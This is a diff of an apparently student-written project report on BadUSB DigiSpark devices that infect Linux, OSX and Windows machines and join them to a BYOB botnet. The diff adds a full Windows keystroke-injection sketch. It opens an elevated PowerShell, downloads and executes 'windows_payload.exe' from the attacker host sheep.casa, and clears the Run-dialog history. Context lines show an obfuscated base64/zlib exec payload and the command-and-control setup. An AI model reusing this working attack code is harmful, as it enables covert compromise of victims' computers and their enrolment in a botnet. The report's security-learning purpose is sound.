@@ -16,7 +16,7 @@ In order to program our USB devices we've installed the [Arduino IDE](https://ww
 ![arduino_download](./images/arduino_download.png)
 **Figure 2:** Download the Arduino IDE.
 
-We've then configured the Arduino IDE to include the DigiSpark board, so that we may use the `DigiKeyboard.h` library.   
+We've then configured the Arduino IDE to include the DigiSpark board so that we may use the `DigiKeyboard.h` library.   
 ![digistump_json](./images/digistump_json.png)
 **Figure 3:** Add DigiStump board manager url to configuration.
 
@@ -60,7 +60,7 @@ As you can see above, the code delays for two seconds to allow the machine to re
 The code for our `linux_loader` and `linux_payload.py` can be found in the section below.
 
 
-#### Loader  
+#### Linux/OSX Loader  
 Our BadUSB attack downloads and executes the loader script. For our attack on Linux and OSX machines this is a bash script called `linux_loader`, which can be found below.
 
 ```bash
@@ -97,9 +97,9 @@ exec(eval(marshal.loads(zlib.decompress(base64.b64decode('eJwrtmBgYCgtyskvSM3TUM
 ### Mac (OSX) Payload
 In order to prevent the keyboard configuration dialog box from appearing when the DigiSpark is plugged into an Apple computer, we must configure the DigiSpark to appear as if it's an Apple keyboard.
 
-VID and PID are defined in the file `~/.arduino15/packages/digistump/hardware/avr/1.6.7/libraries/DigisparkKeyboard/usbconfig.h`. We will replace the existing file with our [modified Apple version](./scripts/Digispark/usbconfig.h) when compiling the script for OSX. When we change Vendor Name and Device Name, we also have to adapt the constants for the name length.
+VID and PID are defined in the file `~/.arduino15/packages/digistump/hardware/avr/1.6.7/libraries/DigisparkKeyboard/usbconfig.h`. We will replace the existing file with a [modified Apple version](./scripts/Digispark/usbconfig.h) when compiling the script for OSX. When we change Vendor Name and Device Name, we also have to adapt the constants for the name length.
 
-The following code is what we've developed thus far to infect Apple OSX machines upon plugin.  
+The following code is what we've developed to infect Apple OSX machines upon plugin.  
 ```c
 #include "DigiKeyboard.h"
 
@@ -142,14 +142,50 @@ void loop() {
 
 As you can see above, is very similar to what we've used to exploit Linux machines. The major difference is the way the terminal is opened. We've had to modify our OSX version to use `DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);`, which will open Spotlight search. The code will delay for .5 seconds, and search "terminal", delay for .5 seconds, and press enter, opening the terminal.
 
-After this, in order to ensure we aren't using Z Shell, we'll enter `bash`. From this point on the rest of the code is exactly the same as our Linux payload.  
+After this, in order to ensure we aren't using Z Shell, we'll enter `bash`. From this point on the rest of the code is exactly the same as our Linux payload. It too downloads `linux_loader`, which downloads and runs `linux_payload.py`.  
 
  
 ### Windows 
-What we need to do here is open PowerShell, and download a precompiled payload for the botnet which includes the whole Python library inside of an executable. This is possible, we may have time to complete it, if not, fuck it.
+Below is the DigiSpark payload we developed to infect Windows victims.
+```c
+#include "DigiKeyboard.h"
+
+void setup()
+{
+  pinMode(1, OUTPUT); //LED on Model A
+  digitalWrite(1, HIGH);
+  DigiKeyboard.delay(500);
+  digitalWrite(1, LOW);
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'https://sheep.casa/payloads/windows_payload.exe'; $file = 'windows_payload.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(100);
+  // Clear run command history
+  DigiKeyboard.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  digitalWrite(1, HIGH);
+}
+
+void loop() {}
+```
+The above code opens powershell to download and execute our `windows_payload.exe`.
 
 
-## Botnet  
+#### Windows Payload for Botnet
+To generate a Windows client for our botnet, we must run the code from a Windows machine to create an executable. Unfortunately, BYOB has a significant amount of bugs at the moment, and cross platform compatibility is not as it claims to be. **To successfully connect to our botnet from Windows, we needed to host the C&C server on a Windows machine.**
+
+
+## Botnet C&C 
 For our botnet we're using [Build Your Own Botnet](https://github.com/malwaredllc/byob). Our ultimate goal was an easily deployed and managed *command and control server*, with the ability to generate cross platform compatible clients.
 
 
@@ -168,7 +204,7 @@ We've created a VPS on Digital Ocean to run our C&C server. We're using an Ubunt
 **Figure 7:** ASCII sheep, just for fun.
 
 
-The botnet framework we're currently using (BYOB) was installed via `git clone git@github.com:malwaredllc/byob.git && cd ./byob/byob && pip install -r requirements.txt &&  mv ../../byob /opt/`. This clones the repository, installs the required python modules, and moves the directory to into `/opt`.  
+The botnet framework we chose (BYOB) was installed via `git clone git@github.com:malwaredllc/byob.git && cd ./byob/byob && pip install -r requirements.txt &&  mv ../../byob /opt/`. This clones the repository, installs the required python modules, and moves the directory to into `/opt`.  
 
 To launch the botnet we've created a bash script setting the host to `sheep.casa` and the listening port to `1337`. This script is placed in the `/root` directory. 
 
@@ -200,31 +236,29 @@ TODO
 
 
 ## Conclusion
-We've configured our BadUSB devices to infect Linux, Windows and OSX machines. Upon plugin, our device will execute a payload to join our Botnet.
+We've configured our BadUSB devices to infect Linux, Windows and OSX machines. Upon plugin, our device will execute a payload to join our Botnet. Below is an elaboration on the successes and failures of the project.
 
 ### Limitations
+
+#### BadUSB
 Ideally, the same BadUSB device would be able to infect Windows, OSX, and Linux. However, from what we've researched this may not be technically achievable given the way USB functions. There seems to be no way to query information from the machine, the device simply sends keystrokes blindly. At this time a DigiSpark must be configured to infect one specific operating system, because currently we do not have knowledge of how to detect which operating system a victim's computer is running. 
 
-We did attempt loading all of our payloads onto one device (Hail Mary). This failed because arbitrary keystrokes were executed on a machine either before or after that machines OS specific code was run. This resulted in unpredictable behavior, which prevented even the correct code from executing sometimes. 
+We did attempt loading all of our payloads onto one device (Hail Mary). This failed because arbitrary keystrokes were executed on a machine either before or after that machine's OS specific code was run. This resulted in unpredictable behavior, which prevented even the correct code from executing sometimes. 
 
-
-### Attack Scenarios
-
-#### Physical Access
-The devices are cheap and small, so carrying three of them should be no issue. If an attacker has physical access to a computer their success rate should be very high. 
-
-#### Dead Drop  
-If an attacker were to want to leave one of these devices in a public place, they'd need to play a numbers game. The likely hood that a victim who uses Windows, finds a devices configured to infect windows, is simply a matter of how many Windows users exists vs OSX users in whatever location the device is dropped. Knowing how many OSX vs Windows users exist in the location of the drop will determine the success rate.
+#### BYOB Botnet
+The botnet framework we chose to use is still very buggy. By the time we concluded that certain limitations could not be overcome, it was no longer an option to pivot the project to a new botnet framework. It turns out the cross platform compatibility of BYOB is not as it claims, as we were not able to connect windows victims to our Linux server. Although we compiled bots on both python 2 and 3, and tried numerous workarounds suggested on Github, it simply would not work. Issues on the GitHub repository for the framework echo our own issues, yet remain unresolved. We raised an issue ourselves at the beginning of the semester, but it was not addressed at the time of writing this report.
 
 ### Further  
-More work that we would do in the future would be to include more technically advanced payloads tailored to each operating system. We would like to check if we are root/admin user, and if so, modify our script to be run on startup for a persistent infection.
+If we were to continue working on this project we would need to find a better botnet framework, or develop our own simple C&C server to handle reverse shells from victims. The bugs in BYOB are too numerous for its lack of support from the developer. 
 
-If our payloads were to use known exploits, we may be able to escalate privileges to root/admin when we had only normal use privileges. This would then allow us to run our script on startup. 
+We would still like to explore the ability to infect all operating systems using the same BadUSB device, but as we said, it couldn't be achieved at this time.
 
-Additionally, we've done very little to hide our tracks. There is much that could be done there.
+### Final Words
+Ultimately our BadUSB devices were extremely successful on all platforms, despite our inability to use the same device for each. Our botnet endeavor was less successful in the end, but we learned a great deal, and if we had time to continue the project we're aware of what direction we would go in to achieve what we were trying to this semester. Time was our greatest limiting factor for this project.
 
 
-## References
-This section is incomplete (obviously). Will finish later.
-
-1. [DigiSpark Apple Keyboard Mod](https://digistump.com/board/index.php?topic=2612.0)
+## References  
+1. [Build Your Own Botnet](https://github.com/malwaredllc/byob)
+2. [DigiSpark Payloads](https://github.com/kbeflo/digispark-payloads).
+3. [DigiSpark Apple Keyboard Mod Explanation](https://digistump.com/board/index.php?topic=2612.0)
+4. [DigiSpark Apple Keyboard `usbconfig.h`](https://github.com/chris408/digispark-usbkey-board/blob/master/usbconfig.h)
